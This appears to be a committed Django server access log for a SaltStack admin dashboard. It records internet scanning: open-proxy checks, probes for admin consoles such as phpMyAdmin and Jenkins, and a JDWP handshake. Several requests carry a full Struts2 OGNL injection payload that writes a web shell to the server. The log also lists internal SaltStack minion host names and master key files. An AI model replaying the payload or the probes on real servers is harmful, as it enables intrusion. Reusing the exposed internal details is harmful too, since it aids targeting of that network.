+Not Found: /http:/www.sogou.com/
+[22/May/2016 00:13:22] "GET http://www.sogou.com/?rands=_21091980201058616446016 HTTP/1.1" 404 1691
+Not Found: /http:/reg.renren.com/
+[22/May/2016 00:13:31] "GET http://reg.renren.com/?rands=_3222499480243045225960 HTTP/1.1" 404 1694
+Not Found: /http:/m.baidu.com/
+[22/May/2016 00:13:31] "GET http://m.baidu.com/?rands=_1715771179013017753196032 HTTP/1.1" 404 1685
+Not Found: /http:/www.kuaidaili.com/
+[22/May/2016 00:13:31] "GET http://www.kuaidaili.com/?rands=_2245661747234675294969028 HTTP/1.1" 404 1709
+[22/May/2016 00:44:31] "GET / HTTP/1.1" 200 3204
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[22/May/2016 02:25:44] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1729
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[22/May/2016 03:42:50] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1729
+Not Found: /http:/zc.qq.com/cgi-bin/common/attr
+[22/May/2016 03:50:00] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.4367809501421193 HTTP/1.1" 404 1736
+Not Found: /http:/www.sogou.com/
+[22/May/2016 03:52:47] "GET http://www.sogou.com/?rands=_2002088191619938602843568 HTTP/1.1" 404 1693
+Not Found: /http:/www.haosou.com/
+[22/May/2016 03:52:47] "GET http://www.haosou.com/?rands=_20562786405320531447520 HTTP/1.1" 404 1695
+Not Found: /http:/reg.renren.com/
+[22/May/2016 03:52:50] "GET http://reg.renren.com/?rands=_1347610212484338721957080 HTTP/1.1" 404 1697
+Not Found: /http:/m.baidu.com/
+[22/May/2016 03:52:50] "GET http://m.baidu.com/?rands=_23886153489611039461645524 HTTP/1.1" 404 1686
+Not Found: /http:/www.kuaidaili.com/
+[22/May/2016 03:52:51] "GET http://www.kuaidaili.com/?rands=_19296137243610592884705960 HTTP/1.1" 404 1710
+Not Found: /examples/servlets/index.html
+[22/May/2016 04:41:23] "GET /examples/servlets/index.html HTTP/1.1" 404 2689
+[22/May/2016 04:41:40] code 400, message Bad request syntax ('JDWP-Handshake')
+[22/May/2016 04:41:40] "JDWP-Handshake" 400 -
+Not Found: /examples/jsp/index.html
+[22/May/2016 04:41:42] "GET /examples/jsp/index.html HTTP/1.1" 404 2674
+[22/May/2016 04:42:51] "GET / HTTP/1.1" 200 3204
+Not Found: /jenkins/
+[22/May/2016 04:42:53] "GET /jenkins/ HTTP/1.1" 404 2629
+[22/May/2016 04:44:31] "GET / HTTP/1.1" 200 3204
+Not Found: /hudson/
+[22/May/2016 04:44:33] "GET /hudson/ HTTP/1.1" 404 2626
+Not Found: /solr/
+[22/May/2016 04:44:41] "GET /solr/ HTTP/1.1" 404 2620
+Not Found: /index.html
+[22/May/2016 04:44:53] "GET /index.html HTTP/1.1" 404 2635
+Not Found: /console/
+[22/May/2016 04:45:22] "GET /console/ HTTP/1.1" 404 2629
+Not Found: /zabbix/
+[22/May/2016 04:45:29] "GET /zabbix/ HTTP/1.1" 404 2626
+Not Found: /cacti/index.php
+[22/May/2016 04:45:46] "GET /cacti/index.php HTTP/1.1" 404 2650
+Not Found: /index.php
+[22/May/2016 04:45:49] "GET /index.php HTTP/1.1" 404 2632
+[22/May/2016 04:45:52] "GET / HTTP/1.1" 200 3204
+Not Found: /axis2/
+[22/May/2016 04:45:55] "GET /axis2/ HTTP/1.1" 404 2623
+Not Found: /jmx-console/
+[22/May/2016 04:45:58] "GET /jmx-console/ HTTP/1.1" 404 2641
+Not Found: /web-console/
+[22/May/2016 04:46:00] "GET /web-console/ HTTP/1.1" 404 2641
+Not Found: /cgi-bin/authlogin.cgi
+[22/May/2016 04:46:10] "GET /cgi-bin/authlogin.cgi HTTP/1.1" 404 2668
+Not Found: /cgi-bin/it.cgi
+[22/May/2016 04:46:10] "GET /cgi-bin/it.cgi HTTP/1.1" 404 2647
+Not Found: /cgi-bin/test-cgi
+[22/May/2016 04:46:11] "GET /cgi-bin/test-cgi HTTP/1.1" 404 2653
+Not Found: /cgi-sys/defaultwebpage.cgi
+[22/May/2016 04:46:14] "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 404 2683
+Not Found: /cgi-sys/FormMail-clone.cgi
+[22/May/2016 04:46:16] "GET /cgi-sys/FormMail-clone.cgi HTTP/1.1" 404 2683
+[22/May/2016 04:46:19] "GET / HTTP/1.1" 200 3204
+Not Found: /axis2/axis2-admin/login
+[22/May/2016 04:46:21] "GET /axis2/axis2-admin/login HTTP/1.1" 404 2674
+Not Found: /j_acegi_security_check
+[22/May/2016 04:46:31] "GET /j_acegi_security_check HTTP/1.1" 404 2671
+Not Found: /phpmyadmin/index.php
+[22/May/2016 04:47:00] "GET /phpmyadmin/index.php HTTP/1.1" 404 2665
+Not Found: /phpMyAdmin/index.php
+[22/May/2016 04:47:04] "GET /phpMyAdmin/index.php HTTP/1.1" 404 2665
+Not Found: /pma/index.php
+[22/May/2016 04:47:10] "GET /pma/index.php HTTP/1.1" 404 2644
+Not Found: /pmd/index.php
+[22/May/2016 04:47:15] "GET /pmd/index.php HTTP/1.1" 404 2644
+Not Found: /phpMyAdmin/main.php
+[22/May/2016 04:48:28] "GET /phpMyAdmin/main.php HTTP/1.1" 404 2662
+Not Found: /pma/main.php
+[22/May/2016 04:48:49] "GET /pma/main.php HTTP/1.1" 404 2641
+Not Found: /pmd/main.php
+[22/May/2016 04:51:16] "GET /pmd/main.php HTTP/1.1" 404 2641
+Not Found: /manager/html
+[22/May/2016 04:51:23] "GET /manager/html HTTP/1.1" 404 2641
+Not Found: /http:/t3.proxy-checks.com/favicon.ico
+[22/May/2016 05:49:44] "GET http://t3.proxy-checks.com/favicon.ico HTTP/1.1" 404 1717
+Not Found: /http:/41.223.52.162/favicon.ico
+[22/May/2016 05:50:02] "GET http://41.223.52.162/favicon.ico HTTP/1.1" 404 1693
+Not Found: /t11.proxy-checks.com:443
+[22/May/2016 05:50:23] "CONNECT t11.proxy-checks.com:443 HTTP/1.1" 404 1681
+Not Found: /158.58.168.237:443
+[22/May/2016 05:50:25] "CONNECT 158.58.168.237:443 HTTP/1.1" 404 1662
+Not Found: /http:/t10.proxy-checks.com/favicon.ico
+[22/May/2016 05:50:49] "POST http://t10.proxy-checks.com/favicon.ico HTTP/1.1" 404 1722
+Traceback (most recent call last):
+  File "/usr/local/python2.7/lib/python2.7/SocketServer.py", line 599, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/local/python2.7/lib/python2.7/SocketServer.py", line 334, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/local/python2.7/lib/python2.7/site-packages/django/core/servers/basehttp.py", line 99, in __init__
+    super(WSGIRequestHandler, self).__init__(*args, **kwargs)
+  File "/usr/local/python2.7/lib/python2.7/SocketServer.py", line 655, in __init__
+    self.handle()
+  File "/usr/local/python2.7/lib/python2.7/site-packages/django/core/servers/basehttp.py", line 164, in handle
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/local/python2.7/lib/python2.7/socket.py", line 480, in readline
+    data = self._sock.recv(self._rbufsize)
+error: [Errno 104] Connection reset by peer
+Not Found: /http:/www.sogou.com/
+[22/May/2016 07:32:35] "GET http://www.sogou.com/?rands=_23688121987419831351894680 HTTP/1.1" 404 1694
+Not Found: /http:/www.haosou.com/
+[22/May/2016 07:32:35] "GET http://www.haosou.com/?rands=_255538350187397146320 HTTP/1.1" 404 1693
+Not Found: /http:/reg.renren.com/
+[22/May/2016 07:32:35] "GET http://reg.renren.com/?rands=_2864549428250410215200 HTTP/1.1" 404 1694
+Not Found: /http:/m.baidu.com/
+[22/May/2016 07:32:37] "GET http://m.baidu.com/?rands=_64262030901715385505260 HTTP/1.1" 404 1683
+Not Found: /http:/www.kuaidaili.com/
+[22/May/2016 07:32:37] "GET http://www.kuaidaili.com/?rands=_1378829120024955561134840 HTTP/1.1" 404 1709
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[22/May/2016 07:45:37] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1729
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[22/May/2016 08:58:37] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1729
+Not Found: /http:/www.proxyjudge.info/azenv.php
+[22/May/2016 09:08:13] "GET http://www.proxyjudge.info/azenv.php HTTP/1.0" 404 1711
+Not Found: /www.baidu.com:443
+[22/May/2016 09:08:14] "CONNECT www.baidu.com:443 HTTP/1.0" 404 1657
+[22/May/2016 09:37:39] "GET / HTTP/1.1" 200 3204
+Not Found: //script
+[22/May/2016 10:30:19] "GET //script HTTP/1.1" 404 2626
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[22/May/2016 11:51:12] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1729
+[22/May/2016 12:43:38] "GET / HTTP/1.1" 200 3204
+Not Found: /http:/www.example.com/
+[22/May/2016 14:34:58] "GET http://www.example.com/ HTTP/1.1" 404 1668
+Not Found: /http:/www.sogou.com/
+[22/May/2016 14:53:03] "GET http://www.sogou.com/?rands=_5832439881226478365568 HTTP/1.1" 404 1690
+Not Found: /http:/www.haosou.com/
+[22/May/2016 14:53:17] "GET http://www.haosou.com/?rands=_225126980043530523307752 HTTP/1.1" 404 1696
+Not Found: /http:/reg.renren.com/
+[22/May/2016 14:53:17] "GET http://reg.renren.com/?rands=_1435139040013326302484000 HTTP/1.1" 404 1697
+Not Found: /http:/m.baidu.com/
+[22/May/2016 14:53:17] "GET http://m.baidu.com/?rands=_256094111217153252330752 HTTP/1.1" 404 1684
+Not Found: /http:/www.kuaidaili.com/
+[22/May/2016 14:53:17] "GET http://www.kuaidaili.com/?rands=_10003114436821899253813376 HTTP/1.1" 404 1710
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[22/May/2016 15:48:25] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1729
+Not Found: /search.yahoo.com:443
+[22/May/2016 16:40:12] "CONNECT search.yahoo.com:443 HTTP/1.1" 404 1665
+Not Found: /http:/www.google.com/reader/about/
+[22/May/2016 16:46:53] "GET http://www.google.com/reader/about/ HTTP/1.1" 404 1703
+Not Found: /vip163mx00.mxmail.netease.com:25
+[22/May/2016 18:04:54] "CONNECT vip163mx00.mxmail.netease.com:25 HTTP/1.0" 404 1701
+Not Found: /http:/zc.qq.com/cgi-bin/common/attr
+[22/May/2016 18:05:07] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.1805174679571775 HTTP/1.1" 404 1736
+[22/May/2016 18:30:30] "GET / HTTP/1.1" 200 3204
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[22/May/2016 19:44:23] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1729
+Not Found: /http:/196.41.139.218/favicon.ico
+[22/May/2016 20:02:55] "GET http://196.41.139.218/favicon.ico HTTP/1.1" 404 1697
+Not Found: /91.233.116.5:443
+[22/May/2016 20:02:59] "CONNECT 91.233.116.5:443 HTTP/1.1" 404 1656
+Not Found: /http:/t1.proxy-checks.com/favicon.ico
+[22/May/2016 20:03:03] "POST http://t1.proxy-checks.com/favicon.ico HTTP/1.1" 404 1718
+Not Found: /http:/t14.proxy-checks.com/favicon.ico
+[22/May/2016 20:03:16] "GET http://t14.proxy-checks.com/favicon.ico HTTP/1.1" 404 1721
+Not Found: /http:/41.223.52.162/favicon.ico
+[22/May/2016 20:03:37] "GET http://41.223.52.162/favicon.ico HTTP/1.1" 404 1693
+Not Found: /149.210.164.14:443
+[22/May/2016 20:03:37] "CONNECT 149.210.164.14:443 HTTP/1.1" 404 1663
+Not Found: /http:/t3.proxy-checks.com/favicon.ico
+[22/May/2016 20:03:41] "POST http://t3.proxy-checks.com/favicon.ico HTTP/1.1" 404 1718
+Not Found: /http:/zc.qq.com/cgi-bin/common/attr
+[22/May/2016 20:40:42] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.8969126661831772 HTTP/1.1" 404 1736
+Not Found: /loginAction.action
+[22/May/2016 21:10:02] "GET /loginAction.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23parameters.info1[0]),%23w.print(%23parameters.info2[0]),%23w.print(%23path),%23w.close(),1?%23xx:%23request.toString&shellname=lndex.jsp&shellContent=x&encoding=UTF-8&pp=%2f&info1=oko&info2=kok HTTP/1.1" 404 3362
+Not Found: /admin/index.action
+[22/May/2016 21:10:02] "GET /admin/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23parameters.info1[0]),%23w.print(%23parameters.info2[0]),%23w.print(%23path),%23w.close(),1?%23xx:%23request.toString&shellname=lndex.jsp&shellContent=x&encoding=UTF-8&pp=%2f&info1=oko&info2=kok HTTP/1.1" 404 5123
+Not Found: /index.action
+[22/May/2016 21:10:02] "GET /index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23parameters.info1[0]),%23w.print(%23parameters.info2[0]),%23w.print(%23path),%23w.close(),1?%23xx:%23request.toString&shellname=lndex.jsp&shellContent=x&encoding=UTF-8&pp=%2f&info1=oko&info2=kok HTTP/1.1" 404 3344
+Not Found: /login.action
+[22/May/2016 21:10:03] "GET /login.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23parameters.info1[0]),%23w.print(%23parameters.info2[0]),%23w.print(%23path),%23w.close(),1?%23xx:%23request.toString&shellname=lndex.jsp&shellContent=x&encoding=UTF-8&pp=%2f&info1=oko&info2=kok HTTP/1.1" 404 3344
+Not Found: /admin/loginAction.action
+[22/May/2016 21:10:03] "GET /admin/loginAction.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23parameters.info1[0]),%23w.print(%23parameters.info2[0]),%23w.print(%23path),%23w.close(),1?%23xx:%23request.toString&shellname=lndex.jsp&shellContent=x&encoding=UTF-8&pp=%2f&info1=oko&info2=kok HTTP/1.1" 404 5141
+Not Found: /index.do
+[22/May/2016 21:10:04] "GET /index.do?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23parameters.info1[0]),%23w.print(%23parameters.info2[0]),%23w.print(%23path),%23w.close(),1?%23xx:%23request.toString&shellname=lndex.jsp&shellContent=x&encoding=UTF-8&pp=%2f&info1=oko&info2=kok HTTP/1.1" 404 3332
+Not Found: /login/Jeecms.do
+[22/May/2016 21:10:04] "GET /login/Jeecms.do?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23parameters.info1[0]),%23w.print(%23parameters.info2[0]),%23w.print(%23path),%23w.close(),1?%23xx:%23request.toString&shellname=lndex.jsp&shellContent=x&encoding=UTF-8&pp=%2f&info1=oko&info2=kok HTTP/1.1" 404 3353
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[22/May/2016 21:50:41] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1729
+Not Found: /http:/zc.qq.com/cgi-bin/common/attr
+[22/May/2016 21:58:35] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.1706270083158616 HTTP/1.1" 404 1736
+Not Found: /http:/zc.qq.com/cgi-bin/common/attr
+[22/May/2016 23:16:03] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.1785316984735904 HTTP/1.1" 404 1736
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[22/May/2016 23:46:57] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1729
+Not Found: /http:/zc.qq.com/cgi-bin/common/attr
+[23/May/2016 00:33:59] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.3732479610741895 HTTP/1.1" 404 1736
+[23/May/2016 02:25:16] "GET / HTTP/1.1" 200 3204
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[23/May/2016 03:47:49] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1729
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[23/May/2016 04:17:24] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1729
+Not Found: /http:/zc.qq.com/cgi-bin/common/attr
+[23/May/2016 04:26:56] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.6860569498157687 HTTP/1.1" 404 1736
+Not Found: /http:/www.sogou.com/
+[23/May/2016 05:33:18] "GET http://www.sogou.com/?rands=_25740100790425255563426864 HTTP/1.1" 404 1694
+Not Found: /http:/www.haosou.com/
+[23/May/2016 05:33:18] "GET http://www.haosou.com/?rands=_221411725129265503570176 HTTP/1.1" 404 1696
+Not Found: /http:/reg.renren.com/
+[23/May/2016 05:33:18] "GET http://reg.renren.com/?rands=_12308848009328411932000 HTTP/1.1" 404 1695
+Not Found: /http:/m.baidu.com/
+[23/May/2016 05:33:18] "GET http://m.baidu.com/?rands=_3384422248684551120672 HTTP/1.1" 404 1682
+Not Found: /http:/www.kuaidaili.com/
+[23/May/2016 05:33:18] "GET http://www.kuaidaili.com/?rands=_69449396404423353697960 HTTP/1.1" 404 1707
+Not Found: /http:/zc.qq.com/cgi-bin/common/attr
+[23/May/2016 07:02:06] "GET http://zc.qq.com/cgi-bin/common/attr?id=260714&r=0.3924232488941690 HTTP/1.1" 404 1736
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[23/May/2016 07:49:23] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1729
+Not Found: /http:/www.sogou.com/
+[23/May/2016 09:11:48] "GET http://www.sogou.com/?rands=_61285271007179484598496 HTTP/1.1" 404 1691
+Not Found: /http:/www.haosou.com/
+[23/May/2016 09:12:02] "GET http://www.haosou.com/?rands=_357095364059303311437184 HTTP/1.1" 404 1696
+Not Found: /http:/reg.renren.com/
+[23/May/2016 09:12:02] "GET http://reg.renren.com/?rands=_14394563244261775869488 HTTP/1.1" 404 1695
+Not Found: /http:/m.baidu.com/
+[23/May/2016 09:12:02] "GET http://m.baidu.com/?rands=_22040236450793485335880 HTTP/1.1" 404 1683
+Not Found: /http:/www.kuaidaili.com/
+[23/May/2016 09:12:02] "GET http://www.kuaidaili.com/?rands=_153109611701077849327700 HTTP/1.1" 404 1708
+Not Found: /examples/servlets/index.html
+[23/May/2016 09:46:00] "GET /examples/servlets/index.html HTTP/1.1" 404 2689
+Not Found: /examples/jsp/index.html
+[23/May/2016 09:46:42] "GET /examples/jsp/index.html HTTP/1.1" 404 2674
+[23/May/2016 09:48:00] code 400, message Bad request syntax ('JDWP-Handshake')
+[23/May/2016 09:48:00] "JDWP-Handshake" 400 -
+[23/May/2016 09:48:14] "GET / HTTP/1.1" 200 3204
+Not Found: /jenkins/
+[23/May/2016 09:48:18] "GET /jenkins/ HTTP/1.1" 404 2629
+Not Found: /http:/t13.proxy-checks.com/favicon.ico
+[23/May/2016 09:48:27] "GET http://t13.proxy-checks.com/favicon.ico HTTP/1.1" 404 1721
+Not Found: /http:/46.148.21.14/favicon.ico
+[23/May/2016 09:48:28] "GET http://46.148.21.14/favicon.ico HTTP/1.1" 404 1689
+Not Found: /http:/t14.proxy-checks.com/favicon.ico
+[23/May/2016 09:48:29] "POST http://t14.proxy-checks.com/favicon.ico HTTP/1.1" 404 1722
+[23/May/2016 09:48:36] "GET / HTTP/1.1" 200 3204
+Not Found: /hudson/
+[23/May/2016 09:48:39] "GET /hudson/ HTTP/1.1" 404 2626
+[23/May/2016 09:48:42] "GET / HTTP/1.1" 200 3204
+Not Found: /solr/
+[23/May/2016 09:48:44] "GET /solr/ HTTP/1.1" 404 2620
+Not Found: /www/admin/index.php
+[23/May/2016 09:48:49] "GET /www/admin/index.php HTTP/1.1" 404 2662
+Not Found: /index.html
+[23/May/2016 09:48:54] "GET /index.html HTTP/1.1" 404 2635
+Not Found: /console/
+[23/May/2016 09:49:01] "GET /console/ HTTP/1.1" 404 2629
+Not Found: /zabbix/
+[23/May/2016 09:49:04] "GET /zabbix/ HTTP/1.1" 404 2626
+[23/May/2016 09:49:06] "GET / HTTP/1.1" 200 3204
+Not Found: /cacti/index.php
+[23/May/2016 09:49:10] "GET /cacti/index.php HTTP/1.1" 404 2650
+Not Found: /index.php
+[23/May/2016 09:49:12] "GET /index.php HTTP/1.1" 404 2632
+[23/May/2016 09:49:16] "GET / HTTP/1.1" 200 3204
+Not Found: /axis2/
+[23/May/2016 09:49:18] "GET /axis2/ HTTP/1.1" 404 2623
+Not Found: /jmx-console/
+[23/May/2016 09:49:22] "GET /jmx-console/ HTTP/1.1" 404 2641
+Not Found: /web-console/
+[23/May/2016 09:49:23] "GET /web-console/ HTTP/1.1" 404 2641
+Not Found: /cgi-bin/authlogin.cgi
+[23/May/2016 09:49:29] "GET /cgi-bin/authlogin.cgi HTTP/1.1" 404 2668
+Not Found: /cgi-bin/it.cgi
+[23/May/2016 09:49:31] "GET /cgi-bin/it.cgi HTTP/1.1" 404 2647
+Not Found: /cgi-bin/test-cgi
+[23/May/2016 09:49:32] "GET /cgi-bin/test-cgi HTTP/1.1" 404 2653
+Not Found: /cgi-sys/defaultwebpage.cgi
+[23/May/2016 09:49:34] "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1" 404 2683
+Not Found: /cgi-sys/FormMail-clone.cgi
+[23/May/2016 09:49:36] "GET /cgi-sys/FormMail-clone.cgi HTTP/1.1" 404 2683
+[23/May/2016 09:49:40] "GET / HTTP/1.1" 200 3204
+Not Found: /axis2/axis2-admin/login
+[23/May/2016 09:49:43] "GET /axis2/axis2-admin/login HTTP/1.1" 404 2674
+Not Found: /j_acegi_security_check
+[23/May/2016 09:49:48] "GET /j_acegi_security_check HTTP/1.1" 404 2671
+Not Found: /phpmyadmin/index.php
+[23/May/2016 09:50:09] "GET /phpmyadmin/index.php HTTP/1.1" 404 2665
+Not Found: /phpMyAdmin/index.php
+[23/May/2016 09:50:16] "GET /phpMyAdmin/index.php HTTP/1.1" 404 2665
+Not Found: /pma/index.php
+[23/May/2016 09:50:18] "GET /pma/index.php HTTP/1.1" 404 2644
+Not Found: /pmd/index.php
+[23/May/2016 09:50:29] "GET /pmd/index.php HTTP/1.1" 404 2644
+Not Found: /phpmyadmin/main.php
+[23/May/2016 09:50:40] "GET /phpmyadmin/main.php HTTP/1.1" 404 2662
+Not Found: /phpMyAdmin/main.php
+[23/May/2016 09:50:45] "GET /phpMyAdmin/main.php HTTP/1.1" 404 2662
+Not Found: /pmd/main.php
+[23/May/2016 09:50:50] "GET /pmd/main.php HTTP/1.1" 404 2641
+[23/May/2016 09:52:54] "GET / HTTP/1.1" 302 0
+[23/May/2016 09:52:55] "GET /index/ HTTP/1.1" 200 9338
+[23/May/2016 09:52:55] "GET /static/bootstrap/css/bootstrap.min.css HTTP/1.1" 304 0
+[23/May/2016 09:52:55] "GET /static/css/sb-admin.css HTTP/1.1" 304 0
+[23/May/2016 09:52:55] "GET /static/font-awesome/css/font-awesome.min.css HTTP/1.1" 304 0
+[23/May/2016 09:52:55] "GET /static/js/jquery.js HTTP/1.1" 304 0
+[23/May/2016 09:52:55] "GET /static/bootstrap/js/bootstrap.min.js HTTP/1.1" 304 0
+[23/May/2016 09:52:55] "GET /static/js/echarts.js HTTP/1.1" 304 0
+[23/May/2016 09:52:55] "GET /static/img/meitianhui.png HTTP/1.1" 304 0
+[23/May/2016 09:52:55] "GET /static/font-awesome/fonts/fontawesome-webfont.woff?v=4.2.0 HTTP/1.1" 304 0
+Not Found: /favicon.ico
+[23/May/2016 09:52:55] "GET /favicon.ico HTTP/1.1" 404 2640
+Not Found: /favicon.ico
+[23/May/2016 09:52:55] "GET /favicon.ico HTTP/1.1" 404 2640
+[23/May/2016 09:52:59] "GET /saltstack/hosts/list_cmd_run_info HTTP/1.1" 200 9837
+[23/May/2016 09:53:11] "GET /saltstack/hosts/cmd_run HTTP/1.1" 200 9512
+[23/May/2016 09:53:12] "GET /static/img/wait.gif HTTP/1.1" 304 0
+[23/May/2016 09:53:19] "POST /saltstack/hosts/cmd_run HTTP/1.1" 200 10690
+ly_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+----------------------------------------
+Exception happened during processing of request from ('95.25.205.201', 37806)
+----------------------------------------
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
+- dip_node1
+- app_api
+- web3
+- web1
+- portal
+- web5
+- svn
+- mobile
+- WEB_DB
+- mps_node1
+- img001
+- db-master
+- supply_web3
+local:
+    - master.pem
+    - master.pub
+minions:
+    - app_api
+    - bangnihui
+    - base_platform_db
+    - db-master
+    - db-redis
+    - dip_node1
+    - htbl.meitianhui.com
+    - img001
+    - loading_balance
+    - mobile
+    - mps_node1
+    - ops_node1
+    - portal
+    - self
+    - supply_img
+    - supply_web2
+    - supply_web3
+    - supply_web4
+    - svn
+    - web1
+    - web3
+    - web5
+    - WEB_DB
+minions_denied:
+minions_pre:
+minions_rejected:
+- db-redis
+- htbl.meitianhui.com
+- supply_img
+- self
+- supply_web2
+- supply_web4
+- base_platform_db
+- ops_node1
+- loading_balance
+- bangnihui
